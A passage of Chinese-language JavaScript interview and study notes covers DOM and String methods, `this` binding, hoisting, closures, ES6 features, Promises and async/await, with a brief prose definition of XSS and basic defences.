//移除属性 delete obj.passWord; console.log(obj); 7、字符串String 对象中的方法下表中列举了 String 对象中提供的方法及其描述信息： 方法 描述 anchor() 创建一个 HTML 锚点，即生成一个&lt;a&gt;标签，标签的 name 属性为 anchor() 方法中的参数 big() 用大号字体显示字符串 blink() 显示闪动的字符串 bold() 使用粗体显示字符串 charAt() 返回在指定位置的字符 charCodeAt() 返回指定字符的 Unicode 编码 concat() 拼接字符串 fixed() 以打字机文本显示字符串 fontcolor() 使用指定的颜色来显示字符串 fontsize() 使用指定的尺寸来显示字符串 fromCharCode() 将字符编码转换为一个字符串 indexOf() 检索字符串，获取给定字符串在字符串对象中首次出现的位置 italics() 使用斜体显示字符串 lastIndexOf() 获取给定字符串在字符串对象中最后出现的位置 link() 将字符串显示为链接 localeCompare() 返回一个数字，并使用该数字来表示字符串对象是大于、小于还是等于给定字符串 match() 根据正则表达式匹配字符串中的字符 replace() 替换与正则表达式匹配的子字符串 search() 获取与正则表达式相匹配字符串首次出现的位置 slice() 截取字符串的片断，并将其返回 small() 使用小字号来显示字符串 split() 根据给定字符将字符串分割为字符串数组 strike() 使用删除线来显示字符串 sub() 把字符串显示为下标 substr() 从指定索引位置截取指定长度的字符串 substring() 截取字符串中两个指定的索引之间的字符 sup() 把字符串显示为上标 toLocaleLowerCase() 把字符串转换为小写 toLocaleUpperCase() 把字符串转换为大写 toLowerCase() 把字符串转换为小写 toUpperCase() 把字符串转换为大写 toString() 返回字符串 valueOf() 返回某个字符串对象的原始值 去除字符串左右两边的空格let str = \" 123 \"; str=str.trim(); // 123 8、js 时间与时间戳的转换时间转时间戳：javascript获得时间戳的方法有四种，都是通过实例化时间对象 new Date() 来进一步获取当前的时间戳 var timetamp4 &#x3D; Number(new Date()) 时间戳转时间function _date(number) &#123; let date &#x3D; new Date(number); let y &#x3D; date.getFullYear(); let m &#x3D; date.getMonth()+1; let d &#x3D; date.getDate(); return (y + &quot;-&quot; + m + &quot;-&quot; + d); &#125; 9、Arguments 对象arguments 是一个对应于传递给函数的参数的类数组对象。 function func1(a, b, c) &#123; console.log(arguments[0]); &#x2F;&#x2F; expected output: 1 console.log(arguments[1]); &#x2F;&#x2F; expected output: 2 console.log(arguments[2]); &#x2F;&#x2F; expected output: 3 &#125; func1(1, 2, 3); 10、Document 对象Document 对象属性和方法HTML文档中可以使用以下属性和方法: 属性 &#x2F; 方法 描述 document.activeElement 返回当前获取焦点元素 document.addEventListener() 向文档添加句柄 document.adoptNode(node) 从另外一个文档返回 adapded 节点到当前文档。 document.anchors 返回对文档中所有 Anchor 对象的引用。 document.applets 返回对文档中所有 Applet 对象的引用。注意: HTML5 已不支持 元素。 document.baseURI 返回文档的绝对基础 URI document.body 返回文档的body元素 document.close() 关闭用 document.open() 方法打开的输出流，并显示选定的数据。 document.cookie 设置或返回与当前文档有关的所有 cookie。 document.createAttribute() 创建一个属性节点 document.createComment() createComment() 方法可创建注释节点。 document.createDocumentFragment() 创建空的 DocumentFragment 对象，并返回此对象。 document.createElement() 创建元素节点。 document.createTextNode() 创建文本节点。 document.doctype 返回与文档相关的文档类型声明 (DTD)。 document.documentElement 返回文档的根节点 document.documentMode 返回用于通过浏览器渲染文档的模式 document.documentURI 设置或返回文档的位置 document.domain 返回当前文档的域名。 document.domConfig 已废弃。返回 normalizeDocument() 被调用时所使用的配置。 document.embeds 返回文档中所有嵌入的内容（embed）集合 document.forms 返回对文档中所有 Form 对象引用。 document.getElementsByClassName() 返回文档中所有指定类名的元素集合，作为 NodeList 对象。 document.getElementById() 返回对拥有指定 id 的第一个对象的引用。 document.getElementsByName() 返回带有指定名称的对象集合。 document.getElementsByTagName() 返回带有指定标签名的对象集合。 document.images 返回对文档中所有 Image 对象引用。 document.implementation 返回处理该文档的 DOMImplementation 对象。 document.importNode() 把一个节点从另一个文档复制到该文档以便应用。 document.inputEncoding 返回用于文档的编码方式（在解析时）。 document.lastModified 返回文档被最后修改的日期和时间。 document.links 返回对文档中所有 Area 和 Link 对象引用。 document.normalize() 删除空文本节点，并连接相邻节点 document.normalizeDocument() 删除空文本节点，并连接相邻节点的 document.open() 打开一个流，以收集来自任何 document.write() 或 document.writeln() 方法的输出。 document.querySelector() 返回文档中匹配指定的CSS选择器的第一元素 document.querySelectorAll() document.querySelectorAll() 是 HTML5中引入的新方法，返回文档中匹配的CSS选择器的所有元素节点列表 document.readyState 返回文档状态 (载入中……) document.referrer 返回载入当前文档的文档的 URL。 document.removeEventListener() 移除文档中的事件句柄(由 addEventListener() 方法添加) document.renameNode() 重命名元素或者属性节点。 document.scripts 返回页面中所有脚本的集合。 document.strictErrorChecking 设置或返回是否强制进行错误检查。 document.title 返回当前文档的标题。 document.URL 返回文档完整的URL document.write() 向文档写 HTML 表达式 或 JavaScript 代码。 document.writeln() 等同于 write() 方法，不同的是在每个表达式之后写一个换行符。 11、JS中阻止冒泡事件冒泡事件：比如说鼠标点击了一个按钮，同样的事件将会在那个元素的所有祖先元素中被触发。这一过程被称为事件冒泡。 &lt;div class=\"box\"> &lt;button class=\"btn\">按钮&lt;/button> &lt;/div> &lt;script type=\"text/javascript\"> $('.btn').click(function () &#123; alert('按钮被点击了') &#125;); $('.box').click(function () &#123; alert('box被点击了') &#125;) &lt;/script> 当我们点击按钮后，因为按钮也属于.box元素，所以按钮的父元素.box也会触发点击事件 $('.btn').click(function (even) &#123; even.stopPropagation(); alert('按钮被点击了'); &#125;) 12、阻止默认事件&lt;a href&#x3D;&quot;javascript:;&quot;&gt;链接&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;javascript:void(0);&quot;&gt;链接&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;&quot; id&#x3D;&quot;link&quot;&gt;链接&lt;&#x2F;a&gt; &lt;script&gt; document.getElementById(&quot;link&quot;).onclick &#x3D; function ()&#123; console.log(&quot;666&quot;); return false; &#125; &lt;&#x2F;script&gt; &lt;a href&#x3D;&quot;&quot; id&#x3D;&quot;link&quot;&gt;链接&lt;&#x2F;a&gt; &lt;script&gt; document.getElementById(&quot;link&quot;).onclick &#x3D; function (e)&#123; console.log(&quot;666&quot;); e.preventDefault(); &#125; &lt;&#x2F;script&gt; 13、window.locationLocation 对象属性 属性 描述 hash 设置或返回从井号 (#) 开始的 URL（锚）。 host 设置或返回主机名和当前 URL 的端口号。 hostname 设置或返回当前 URL 的主机名。 href 设置或返回完整的 URL。 pathname 设置或返回当前 URL 的路径部分。 port 设置或返回当前 URL 的端口号。 protocol 设置或返回当前 URL 的协议。 search 设置或返回从问号 (?) 开始的 URL（查询部分）。 Location 对象方法 属性 描述 assign() 加载新的文档。 reload() 重新加载当前文档。 replace() 用新的文档替换当前文档。 14、原型与原型链原型 prototype原型是函数特有 &lt;script> function fu()&#123; &#125; fu.prototype.name = 'kif' console.log(fu.prototype.name) &lt;/script> 挂载在原型上是为了继承(通过new) 继承后查找时就近， 判断属性时继承的还是后天添加的：hasOwnProperty 可以拿到p1的私有属性 这个方法既不是Persion也不是p1的，而是Persion继承自Object的 原型链：_proto_对象，数组，函数等有原型链 预编译function fn(a,c)&#123; console.log(a) var a =123; console.log(a) console.log(c) function a()&#123;&#125; if(false)&#123; var d =678 &#125; console.log(d) console.log(b) var b =function()&#123;&#125; console.log(b) function c()&#123;&#125; console.log(c) &#125; fn(2,3) 预编译步骤： 创建AO对象 AO：&#123; &#125; 找形参和变量声明 AO：&#123; a:undefind c:undefind d:undefind bLundefind &#125; 实参与形参相统一 AO：&#123; a:2 c:3 d:undefind b:undefind &#125; 找函数申明（会覆盖变量） AO：&#123; a:function a()&#123;&#125; c:function c()&#123;&#125; d:undefind b:undefind &#125; 注:var b &#x3D;function(){}不是函数声明 逐行执行 function fn(a,c)&#123; console.log(a)&#x2F;&#x2F;function a()&#123;&#125; var a &#x3D;123; console.log(a)&#x2F;&#x2F;123 console.log(c)&#x2F;&#x2F;function c()&#123;&#125; function a()&#123;&#125; if(false)&#123; var d &#x3D;678 &#125; console.log(d)&#x2F;&#x2F;undefind console.log(b)&#x2F;&#x2F;undefind var b &#x3D;function()&#123;&#125; console.log(b)&#x2F;&#x2F;function()&#123;&#125; function c()&#123;&#125; console.log(c)&#x2F;&#x2F;function c()&#123;&#125; &#125; fn(2,3) 15、this函数直接调用function get(a)&#123; console.log(a) &#125; get(&#39;kif&#39;) 其中 get(‘kif’) 其实是get.call(window,’kif’ ) 即：对象.方法.call(对象，参数) 对象方法var Persion = &#123; name: 'kif', getName: function (time) &#123; console.log(this.name,time) &#125; &#125; Persion.getName(299) 同理： Persion.getName(299)为：Persion.getName.call(Persion,299) 案例：var name = 222 var a=&#123; name :111, say:function()&#123; console.log(this.name) &#125; &#125; var fun = a.say fun()//fun.call(window,)======>222 a.say()//a.say.call(a,)=======>111 var b =&#123; name:333, say:function(fun)&#123; fun()//fun.call(window,)//222 &#125; &#125; b.say(a.say)// b.say=a.say b.say()//b.say.call(b,)=======>333 箭头函数中thisvar x =11 var p =&#123; x:22, say:()=>&#123; console.log(this.x) &#125; &#125; p.say() 箭头函数中this固定指向代码块外部 this指向（普通函数、箭头函数）参考答案： 普通函数中的this 谁调用了函数或者方法，那么这个函数或者对象中的this就指向谁 let getThis = function () &#123; console.log(this); &#125; let obj=&#123; name:\"Jack\", getThis:function()&#123; console.log(this); &#125; &#125; //getThis()方法是由window在全局作用域中调用的，所以this指向调用该方法的对象，即window getThis();//window //此处的getThis()方法是obj这个对象调用的，所以this指向obj obj.getThis();//obj 匿名函数中的this：匿名函数的执行具有全局性，则匿名函数中的this指向是window，而不是调用该匿名函数的对象； let obj = &#123; getThis: function () &#123; return function () &#123; console.log(this); &#125; &#125; &#125; obj.getThis()(); //window 上面代码中，getThi()方法是由obj调用，但是obj.getThis()返回的是一个匿名函数，而匿名函数中的this指向window，所以打印出window。 如果想在上述代码中使this指向调用该方法的对象，可以提前把this传值给另外一个变量(_this或者that)： let obj = &#123; getThis: function () &#123; //提前保存this指向 let _this=this return function () &#123; console.log(_this); &#125; &#125; &#125; obj.getThis()(); //obj 箭头函数中的this 箭头函数中的this是在函数定义的时候就确定下来的，而不是在函数调用的时候确定的； 箭头函数中的this指向父级作用域的执行上下文；（技巧：因为javascript中除了全局作用域，其他作用域都是由函数创建出来的，所以如果想确定this的指向，则找到离箭头函数最近的function，与该function平级的执行上下文中的this即是箭头函数中的this） 箭头函数无法使用apply、call和bind方法改变this指向，因为其this值在函数定义的时候就被确定下来。 例1：首先，距离箭头函数最近的是getThis(){}，与该函数平级的执行上下文是obj中的执行上下文，箭头函数中的this就是下注释代码处的this，即obj。 let obj = &#123; //此处的this即是箭头函数中的this getThis: function () &#123; return ()=> &#123; console.log(this); &#125; &#125; &#125; obj.getThis()(); //obj 例2：该段代码中存在两个箭头函数，this找不到对应的function(){}，所以一直往上找直到指向window。 复制代码 //代码中有两个箭头函数，由于找不到对应的function，所以this会指向window对象。 let obj = &#123; getThis: ()=> &#123; return ()=> &#123; console.log(this); &#125; &#125; &#125; obj.getThis()(); //window 16、闭包形式：方法里面返回一个方法 function a() &#123; let a = 1; return function () &#123; return a; &#125;; &#125; 意义： 延长变量生命周期 创建私有环境 Vue中data也是一个闭包 data（）&#123; return&#123; &#125; &#125; 会常驻内存，所以慎用 17、ES6var let constvar: 变量提升 console.log(a)//undefined var a = 12 变量覆盖 var a =12 var a =23 console.log(a)//23 没有块级作用域 function fu()&#123; for(var i=0;i&lt;3;i++)&#123; console.log(i) &#125; console.log(i)//3 &#125; const: const声明之后必须赋值 const定义数组，可以对数组修改 const arr = [\"sad\", \"666\", \"qewqe\"]; arr.push('5465') console.log(arr) 解构let a&#x3D;1; let b &#x3D;2; 不使用第三个变量互换值 [a,b]&#x3D;[b,a] 去重let arr=[1,2,3,4,5,2,3,4,2] let ans = [...new Set(arr)] console.log(ans) promiselet p = new Promise((resolve, reject) => &#123; console.log(1) resolve() console.log(2) &#125;) p.then(() => &#123; console.log(3) &#125;) console.log(4) 构造函数同步执行 &#x2F;&#x2F;1,2 异步函数异步执行 &#x2F;&#x2F;4,3 18、xssxss（cross-site-scripting）攻击指的是攻击者往 web 页面里插入恶意 html 标签或者 javascript 代码 ；首先代码里对用户输入的地方和变量都需要仔细检查长度和对 “&lt;&gt; , ; . ”等字进行过滤；其次任何内容写到页面之前都必须加 encode，避免不小心把 html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击 ；攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取 cookie 中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器汇总，而不是用户原本以为的信任站点 ； 19、SEOSEO： Search Engine Optimization, 搜索引擎优化。利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名。目的是让其在行业内占据领先地位，获得品牌收益。很大程度上是网站经营者的一种商业行为，将自己或自己公司的排名前移。SEO是提高你网站排名的一个很有效的方法，这个完善和优化你网站的排名因素的方法就是能影响搜索引擎的排名的算法。 因此，SEO是网络营销策略 （online marketing Digital strategy）和数字营销策略 （Digital Marketing strategy）中很重要的一个环节。SEO使你的网站获取得更多的流量（traffic）同时也可以提高你在搜索引擎的排名。那就意味你可以获取得更多的订单，更多的利润。 20、数组去重ES6： let arr = [12, 12, 3, 2, 23, 23, 4, 3, 2]; function unique(arr) &#123; return Array.from(new Set(arr)); &#125; console.log(unique(arr)); let arr = [12, 12, 34, 21, 34, 21, 5, 2, 5]; function unique(arr) &#123; return [...new Set(arr)]; &#125; console.log(unique(arr)); ES5： let arr = [12, 12, 3, 4, 4, 3, 5, 23, 12, 3]; function unique(arr) &#123; let Newarr = []; for (let i = 0; i &lt; arr.length; i++) &#123; if (Newarr.indexOf(arr[i]) == -1) &#123; Newarr.push(arr[i]); &#125; &#125; return Newarr; &#125; console.log(unique(arr)); 21、数组和伪数组的区别 定义 数组是一个特殊对象,与常规对象的区别： 当由新元素添加到列表中时，自动更新length属性 设置length属性，可以截断数组 从Array.protoype中继承了方法 属性为’Array’ 类数组是一个拥有length属性，并且他属性为非负整数的普通对象，类数组不能直接调用数组方法。 区别本质：类数组是简单对象，它的原型关系与数组不同。 // 原型关系和原始值转换 let arrayLike = &#123; length: 10, &#125;; console.log(arrayLike instanceof Array); // false console.log(arrayLike.__proto__.constructor === Array); // false console.log(arrayLike.toString()); // [object Object] console.log(arrayLike.valueOf()); // &#123;length: 10&#125; let array = []; console.log(array instanceof Array); // true console.log(array.__proto__.constructor === Array); // true console.log(array.toString()); // '' console.log(array.valueOf()); // [] 类数组转换为数组 转换方法 使用 Array.from() 使用 Array.prototype.slice.call() 使用 Array.prototype.forEach() 进行属性遍历并组成新的数组 转换须知 转换后的数组长度由 length 属性决定。索引不连续时转换结果是连续的，会自动补位。 代码示例 let al1 = &#123; length: 4, 0: 0, 1: 1, 3: 3, 4: 4, 5: 5, &#125;; console.log(Array.from(al1)) // [0, 1, undefined, 3] ②仅考虑 0或正整数 的索引 // 代码示例 let al2 = &#123; length: 4, '-1': -1, '0': 0, a: 'a', 1: 1 &#125;; console.log(Array.from(al2)); // [0, 1, undefined, undefined] ③使用slice转换产生稀疏数组 // 代码示例 let al2 = &#123; length: 4, '-1': -1, '0': 0, a: 'a', 1: 1 &#125;; console.log(Array.prototype.slice.call(al2)); //[0, 1, empty × 2] 使用数组方法操作类数组注意地方 复制代码 let arrayLike2 = &#123; 2: 3, 3: 4, length: 2, push: Array.prototype.push &#125; // push 操作的是索引值为 length 的位置 arrayLike2.push(1); console.log(arrayLike2); // &#123;2: 1, 3: 4, length: 3, push: ƒ&#125; arrayLike2.push(2); console.log(arrayLike2); // &#123;2: 1, 3: 2, length: 4, push: ƒ&#125; 22、手写一个发布订阅// 发布订阅中心, on-订阅, off取消订阅, emit发布, 内部需要一个单独事件中心caches进行存储; interface CacheProps &#123; [key: string]: Array&lt;((data?: unknown) => void)>; &#125; class Observer &#123; private caches: CacheProps = &#123;&#125;; // 事件中心 on (eventName: string, fn: (data?: unknown) => void)&#123; // eventName事件名-独一无二, fn订阅后执行的自定义行为 this.caches[eventName] = this.caches[eventName] || []; this.caches[eventName].push(fn); &#125; emit (eventName: string, data?: unknown) &#123; // 发布 => 将订阅的事件进行统一执行 if (this.caches[eventName]) &#123; this.caches[eventName].forEach((fn: (data?: unknown) => void) => fn(data)); &#125; &#125; off (eventName: string, fn?: (data?: unknown) => void) &#123; // 取消订阅 => 若fn不传, 直接取消该事件所有订阅信息 if (this.caches[eventName]) &#123; const newCaches = fn ? this.caches[eventName].filter(e => e !== fn) : []; this.caches[eventName] = newCaches; &#125; &#125; &#125; 23、介绍下 Set、Map、WeakSet 和 WeakMap 的区别？参考答案： Set 成员不能重复； 只有键值，没有键名，有点类似数组； 可以遍历，方法有 add、delete、has WeakSet 成员都是对象（引用）； 成员都是弱引用，随时可以消失（不计入垃圾回收机制）。可以用来保存 DOM 节点，不容易造成内存泄露； 不能遍历，方法有 add、delete、has； Map 本质上是键值对的集合，类似集合； 可以遍历，方法很多，可以跟各种数据格式转换； WeakMap 只接收对象为键名（null 除外），不接受其他类型的值作为键名； 键名指向的对象，不计入垃圾回收机制； 不能遍历，方法同 get、set、has、delete； 24、简单说说 js 中有哪几种内存泄露的情况 意外的全局变量； 闭包； 未被清空的定时器； 未被销毁的事件监听； DOM 引用； 25、json和xml数据的区别参考答案： 数据体积方面：xml是重量级的，json是轻量级的，传递的速度更快些。 数据传输方面：xml在传输过程中比较占带宽，json占带宽少，易于压缩。 数据交互方面：json与javascript的交互更加方便，更容易解析处理，更好的进行数据交互 数据描述方面：json对数据的描述性比xml较差 xml和json都用在项目交互下，xml多用于做配置文件，json用于数据交互。 26、JavaScript有几种方法判断变量的类型?参考答案： 使用typeof检测当需要判断变量是否是number, string, boolean, function, undefined等类型时，可以使用typeof进行判断。 使用instanceof检测instanceof运算符与typeof运算符相似，用于识别正在处理的对象的类型。与typeof方法不同的是，instanceof 方法要求开发者明确地确认对象为某特定类型。 使用constructor检测constructor本来是原型对象上的属性，指向构造函数。但是根据实例对象寻找属性的顺序，若实例对象上没有实例属性或方法时，就去原型链上寻找，因此，实例对象也是能使用constructor属性的。 27、MathMath 对象方法 方法 描述 abs(x) 返回 x 的绝对值。 acos(x) 返回 x 的反余弦值。 asin(x) 返回 x 的反正弦值。 atan(x) 以介于 -PI&#x2F;2 与 PI&#x2F;2 弧度之间的数值来返回 x 的反正切值。 atan2(y,x) 返回从 x 轴到点 (x,y) 的角度（介于 -PI&#x2F;2 与 PI&#x2F;2 弧度之间）。 ceil(x) 对数进行上舍入。 cos(x) 返回数的余弦。 exp(x) 返回 Ex 的指数。 floor(x) 对 x 进行下舍入。 log(x) 返回数的自然对数（底为e）。 max(x,y,z,…,n) 返回 x,y,z,…,n 中的最高值。 min(x,y,z,…,n) 返回 x,y,z,…,n中的最低值。 pow(x,y) 返回 x 的 y 次幂。 random() 返回 0 ~ 1 之间的随机数。 round(x) 四舍五入。 sin(x) 返回数的正弦。 sqrt(x) 返回数的平方根。 tan(x) 返回角的正切。 Math.max(...[14, 3, 77]) //ES6 的写法，等同于Math.max(14, 3, 77) 题目： var min = Math.min(); var max = Math.max(); console.log(min &lt; max); // 写出执行结果，并解释原因 答案false 解析 按常规的思路，这段代码应该输出 true，毕竟最小值小于最大值。但是却输出 false MDN 相关文档是这样解释的 Math.min 的参数是 0 个或者多个，如果多个参数很容易理解，返回参数中最小的。如果没有参数，则返回 Infinity，无穷大。 而 Math.max 没有传递参数时返回的是-Infinity.所以输出 false 28、promise和 async await 区别参考答案： 概念Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大，简单地说，Promise好比容器，里面存放着一些未来才会执行完毕（异步）的事件的结果，而这些结果一旦生成是无法改变的 async await也是异步编程的一种解决方案，他遵循的是Generator 函数的语法糖，他拥有内置执行器，不需要额外的调用直接会自动执行并输出结果，它返回的是一个Promise对象。 两者的区别 Promise的出现解决了传统callback函数导致的“地域回调”问题，但它的语法导致了它向纵向发展行成了一个回调链，遇到复杂的业务场景，这样的语法显然也是不美观的。而async await代码看起来会简洁些，使得异步代码看起来像同步代码，await的本质是可以提供等同于”同步效果“的等待异步返回能力的语法糖，只有这一句代码执行完，才会执行下一句。 async await与Promise一样，是非阻塞的。 async await是基于Promise实现的，可以说是改良版的Promise，它不能用于普通的回调函数。 29、 defer和async区别参考答案： 区别主要在于一个执行时间,defer会在文档解析完之后执行,并且多个defer会按照顺序执行,而async则是在js加载好之后就会执行,并且多个async,哪个加载好就执行哪个 解析： 在没有defer或者async的情况下：会立即执行脚本,所以通常建议把script放在body最后 &lt;script src=\"script.js\">&lt;/script> async：有async的话,加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行（异步）。但是多个js文件的加载顺序不会按照书写顺序进行 &lt;script async src=\"script.js\">&lt;/script> derer：有derer的话,加载后续文档元素的过程将和 script.js 的加载并行进行（异步），但是 script.js 的执行要在所有元素解析完成之后，DOMContentLoaded 事件触发之前完成,并且多个defer会按照顺序进行加载。 &lt;script defer src=\"script.js\">&lt;/script> 30、同步和异步参考答案： 同步 指在 主线程上排队执行的任务，只有前一个任务执行完毕，才能继续执行下一个任务。 也就是调用一旦开始，必须这个调用 返回结果(划重点——）才能继续往后执行。程序的执行顺序和任务排列顺序是一致的。 异步 异步任务是指不进入主线程，而进入 任务队列的任务，只有任务队列通知主线程，某个异步任务可以执行了，该任务才会进入主线程。 每一个任务有一个或多个 回调函数。前一个任务结束后，不是执行后一个任务,而是执行回调函数，后一个任务则是不等前一个任务结束就执行。 程序的执行顺序和任务的排列顺序是不一致的，异步的。 我们常用的setTimeout和setInterval函数，Ajax都是异步操作。 31、 实现异步的方法参考答案： 回调函数（Callback）、事件监听、发布订阅、Promise&#x2F;A+、生成器Generators&#x2F; yield、async&#x2F;await JS 异步编程进化史：callback -&gt; promise -&gt; generator -&gt; async + await async&#x2F;await 函数的实现，就是将 Generator 函数和自动执行器，包装在一个函数里。 async&#x2F;await可以说是异步终极解决方案了。 (1) async&#x2F;await函数相对于Promise，优势体现在： 处理 then 的调用链，能够更清晰准确的写出代码 并且也能优雅地解决回调地狱问题。 当然async&#x2F;await函数也存在一些缺点，因为 await 将异步代码改造成了同步代码，如果多个异步代码没有依赖性却使用了 await 会导致性能上的降低，代码没有依赖性的话，完全可以使用 Promise.all 的方式。 (2) async&#x2F;await函数对 Generator 函数的改进，体现在以下三点： 内置执行器。 Generator 函数的执行必须靠执行器，所以才有了 co 函数库，而 async 函数自带执行器。也就是说，async 函数的执行，与普通函数一模一样，只要一行。 更广的适用性。 co 函数库约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 async 函数的 await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）。 更好的语义。 async 和 await，比起星号和 yield，语义更清楚了。async 表示函数里有异步操作，await 表示紧跟在后面的表达式需要等待结果。 async&#x2F;await Async&#x2F;Await简介 使用async&#x2F;await，你可以轻松地达成之前使用生成器和co函数所做到的工作,它有如下特点： async&#x2F;await是基于Promise实现的，它不能用于普通的回调函数。 async&#x2F;await与Promise一样，是非阻塞的。 3. async&#x2F;await使得异步代码看起来像同步代码，这正是它的魔力所在。 一个函数如果加上 async ，那么该函数就会返回一个 Promise async function async1() &#123; return \"1\" &#125; console.log(async1()) // -> Promise &#123;&lt;resolved>: \"1\"&#125; Generator函数依次调用三个文件那个例子用async&#x2F;await写法，只需几句话便可实现 let fs = require('fs') function read(file) &#123; return new Promise(function(resolve, reject) &#123; fs.readFile(file, 'utf8', function(err, data) &#123; if (err) reject(err) resolve(data) &#125;) &#125;) &#125; async function readResult(params) &#123; try &#123; let p1 = await read(params, 'utf8')//await后面跟的是一个Promise实例 let p2 = await read(p1, 'utf8') let p3 = await read(p2, 'utf8') console.log('p1', p1) console.log('p2', p2) console.log('p3', p3) return p3 &#125; catch (error) &#123; console.log(error) &#125; &#125; readResult('1.txt').then( // async函数返回的也是个promise data => &#123; console.log(data) &#125;, err => console.log(err) ) // p1 2.txt // p2 3.txt // p3 结束 // 结束 5.2 Async&#x2F;Await并发请求 如果请求两个文件，毫无关系，可以通过并发请求 let fs = require('fs') function read(file) &#123; return new Promise(function(resolve, reject) &#123; fs.readFile(file, 'utf8', function(err, data) &#123; if (err) reject(err) resolve(data) &#125;) &#125;) &#125; function readAll() &#123; read1() read2()//这个函数同步执行 &#125; async function read1() &#123; let r = await read('1.txt','utf8') console.log(r) &#125; async function read2() &#123; let r = await read('2.txt','utf8') console.log(r) &#125; readAll() // 2.txt 3.txt 32、 promise的介绍与使用Promise 介绍： ES6中的Promise 是异步编程的一种方案。从语法上讲，Promise 是一个对象，它可以获取异步操作的消息。 Promise对象, 可以将异步操作以同步的流程表达出来。使用 Promise 主要有以下好处： 可以很好地解决回调地狱的问题（避免了层层嵌套的回调函数）。 语法非常简洁。Promise 对象提供了简洁的API，使得控制异步操作更加容易。 Promise 使用： 语法 var promise = new Promise((resolve, reject) => &#123;/* executor函数 */ // ... some code if (/* 异步操作成功 */)&#123; resolve(value); &#125; else &#123; reject(error); &#125; &#125;); promise.then((value) => &#123; //success &#125;, (error) => &#123; //failure &#125;) 参数executor 函数在Promise构造函数执行时同步执行，被传递 resolve 和 reject 函数（executor函数在Promise构造函数返回新建对象前被调用）。executor 内部通常会执行一些异步操作，一旦完成，可以调用resolve函数来将promise状态改成fulfilled(完成)，或者将promise的状态改为rejected(失败)。如果在executor函数中抛出一个错误，那么该promise 状态为rejected。executor函数的返回值被忽略。 简单使用 function timeout(ms) &#123; return new Promise((resolve, reject) => &#123; setTimeout(resolve, ms, 'done'); &#125;); &#125; timeout(2000).then((value) => &#123; console.log(value); //done &#125;); 原型方法 Promise.prototype.then(onFulfilled, onRejected) 语法p.then(onFulfilled, onRejected);p.then((value) =&gt; &#123;// fulfillment&#125;, (reason) =&gt; &#123;// rejection&#125;); 含义为 Promise实例添加状态改变时的回调函数。then方法的第一个参数是resolved状态的回调函数，第二个参数（可选）是rejected状态的回调函数。 链式操作then方法返回的是一个新的promise，因此可以采用链式写法，即then方法后面再调用另一个then方法。 new Promise(resolve => &#123; resolve(1); &#125;) .then(result => console.log(result)) //1 .then(result => &#123; console.log(result); //undefined return 2; &#125;) .then(result => &#123; console.log(result); //2 throw new Error(\"err\"); &#125;) .then((result) =>&#123; console.log(result); &#125;, (err)=>&#123; console.log(err); //Error: err return 3; &#125;) .then((result) => &#123; console.log(result); //3 &#125;) 注意：①不管是then方法的onfulfilled函数参数执行还是onrejected（可选参数）函数参数执行，then方法返回的都是一个新的Promise对象，都可以继续采用链式写法调用另一个then方法。②Promise.prototype.catch()方法返回的也是一个Promise对象。then方法和catch方法可以链式操作。 返回值then方法返回一个Promise，而它的行为与then中的被调用的回调函数(onfulfilled函数&#x2F;onrejected函数)的返回值有关。(1) 如果then中的回调函数返回一个值，那么then返回的Promise将会成为接受状态，并且将返回的值作为接受状态的回调函数的参数值。 new Promise((resolve, reject) => &#123; reject(); &#125;) .then( () => 99, () => 42 ) .then( result => console.log(result)); // 42 (2) 如果then中的回调函数抛出一个错误，那么then返回的Promise将会成为拒绝状态，并且将抛出的错误作为拒绝状态的回调函数的参数值。 new Promise((resolve, reject) => &#123; resolve(); &#125;) .then( () => &#123;throw new Error('err')&#125;, () => &#123;&#125;) .then( () => &#123;&#125;, (err) => &#123;console.log(err)&#125;); //Error: err (3) 如果then中的回调函数返回一个已经是接受状态的Promise，那么then返回的Promise也会成为接受状态，并且将那个Promise的接受状态的回调函数的参数值作为该被返回的Promise的接受状态回调函数的参数值。 new Promise((resolve, reject) => &#123; resolve(); &#125;) .then( () => &#123; return new Promise(resolve => resolve('ok')); &#125;) .then( (result) => &#123;console.log(result)&#125;); //ok (4) 如果then中的回调函数返回一个已经是拒绝状态的Promise，那么then返回的Promise也会成为拒绝状态，并且将那个Promise的拒绝状态的回调函数的参数值作为该被返回的Promise的拒绝状态回调函数的参数值。 new Promise((resolve, reject) => &#123; resolve(); &#125;) .then( () => &#123; return new Promise((resolve, reject) => &#123; reject(new Error('err')); &#125;); &#125;) .then( () => &#123;&#125;, (err) => &#123;console.log(err)&#125;); //Error: err (5) 如果then中的回调函数返回一个未定状态（pending）的Promise，那么then返回Promise的状态也是未定的，并且它的终态与那个Promise的终态相同；同时，它变为终态时调用的回调函数参数与那个Promise变为终态时的回调函数的参数是相同的。 new Promise((resolve, reject) => &#123; resolve(); &#125;) .then(() => &#123; return new Promise(resolve => &#123; setTimeout(resolve, 2000, 'ok'); &#125;); &#125;) .then( (result) => &#123;console.log(result)&#125;); //ok 注意：这里是then方法中被调用回调函数的返回值与then方法返回的Promise对象状态之间的关系。 Promise.prototype.catch(onRejected) 语法 p.catch(onRejected); p.catch(function(reason) &#123; // 拒绝 &#125;); 含义Promise.prototype.catch方法是.then(null, rejection)的别名，用于指定发生错误时的回调函数，返回一个新的promise对象。 用法 const p = new Promise((resolve,reject) => &#123; return reject(new Error('err')); //reject方法的作用，等同于抛出错误 //throw new Error('err'); &#125;); p.then(null, (err) => &#123; console.log(err); //Err: err &#125;); //--------等价写法--------- p.catch(err => &#123; console.log(err); //Err: err &#125;) 注意：由于.catch方法是.then(null, rejection)的别名，故.then中的链式操作(3)、返回值(4)等语法在.catch中都适用。 一般总是建议，Promise 对象后面要跟catch方法，这样可以处理 Promise内部发生的错误。catch方法返回的还是一个 Promise 对象，因此后面还可以接着调用then方法。 Promise对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个catch语句捕获。 即：当前catch方法可以捕获上一个catch方法(包括上一个catch)到当前catch(不包括当前catch)方法之间所有的错误，如果没有错误，则当前catch方法不执行。 new Promise(() &#x3D;&gt; &#123; throw new 